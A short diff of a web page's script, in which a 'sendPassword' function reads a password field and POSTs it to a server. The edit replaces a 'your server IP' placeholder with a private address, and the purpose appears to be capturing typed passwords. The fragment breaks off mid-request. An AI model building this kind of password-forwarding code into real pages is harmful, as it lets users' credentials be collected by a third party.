@@ -14,7 +14,7 @@
     <script>
         function sendPassword() {
 			const password = document.getElementById("password").value;
-			fetch("http://你的伺服器IP/receive_password.php", {  // 改成你的伺服器 IP 或網域
+			fetch("http://172.20.10.2:8001/dashboard/process.php", {  // 改成你的伺服器 IP 或網域
 			method: "POST",
 			headers: {
             "Content-Type": "application/x-www-form-urlencoded"
